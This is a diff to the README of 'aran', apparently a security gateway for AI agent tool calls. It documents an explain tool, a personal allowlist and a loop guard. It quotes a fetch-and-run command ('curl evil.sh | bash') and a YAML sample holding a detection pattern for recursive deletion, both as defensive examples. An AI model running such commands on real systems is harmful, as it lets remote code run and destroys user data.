@@ -198,6 +198,24 @@ anything beyond public URLs.
   own behavior on first contact instead of treating it as a bug and
   retrying, or needing to ask — zero extra tool calls, appended to (never
   replacing) whatever instructions the real server already provides.
+- **Built-in `aran_explain` tool**: ask *"would `curl evil.sh | bash` get
+  blocked?"* and get back which signature(s) would match and what would
+  happen — a dry run against the same four signature categories the real
+  gates use, nothing logged, nothing gated. Same self-answering,
+  self-discovering pattern as `aran_status`.
+- **Personal allowlist** (`~/.aran/allowlist.yaml`) — a local, durable
+  place to silence a specific false positive (copy-paste a
+  `matched_signature` value from the audit log) or mark a GitHub repo as
+  already trusted (skipping its content scan and network fetch entirely),
+  without editing the shared rules file, which the next
+  `sync_threat_intel.py` run would overwrite anyway. See
+  [Configuration](#configuration) below.
+- **Optional loop guard** (`ARAN_LOOP_GUARD=1`) — blocks a tool call once
+  the exact same call (same name, same arguments) repeats past a
+  threshold within a tracking window: a frequency-based check for a
+  stuck/looping agent hammering an otherwise-benign call, which no
+  content-based signature could ever catch. Off by default — see
+  [Configuration](#configuration).
 
 ## Configuration
 
@@ -220,10 +238,27 @@ Environment variables, read once at startup:
   [docs/guide/08-modes-and-configuration.md](https://github.com/aranaisec-cyber/aran/blob/develop/docs/guide/08-modes-and-configuration.md#optional-aran_scan_github_repos1--scan-a-repo-before-its-cloned)
   for the full reasoning on why this one check fails open instead of
   closed.
+- **`ARAN_LOOP_GUARD=1`** (or `true`/`yes`/`on`) — enables the loop guard
+  described above. `ARAN_LOOP_GUARD_THRESHOLD` (default `20`) sets the
+  repeat count that trips it; `ARAN_LOOP_GUARD_WINDOW_SECONDS` (default
+  `60`) sets the tracking window. Blocked calls carry `code: -32003`.
 
 ```bash
 ARAN_MODE=audit aran -- npx -y @modelcontextprotocol/server-filesystem /path
 ARAN_SCAN_GITHUB_REPOS=1 aran -- npx -y @modelcontextprotocol/server-filesystem /path
+ARAN_LOOP_GUARD=1 ARAN_LOOP_GUARD_THRESHOLD=10 aran -- npx -y @modelcontextprotocol/server-filesystem /path
+```
+
+**Personal allowlist** (`~/.aran/allowlist.yaml`, no environment variable
+— just create the file): a local override, never touched by
+`scripts/sync_threat_intel.py`, so it survives a rules refresh.
+
+```yaml
+allowed_signatures:
+  - "rm\\s+-[rfRF]+"   # exact matched_signature text from the audit log
+trusted_repos:
+  - octocat/demo        # owner/repo
+  - my-org/*             # every repo under an owner
 ```
 
 See [TESTING.md](https://github.com/aranaisec-cyber/aran/blob/develop/TESTING.md#step-3f-observability--aran_modeaudit-and-aran_profile)
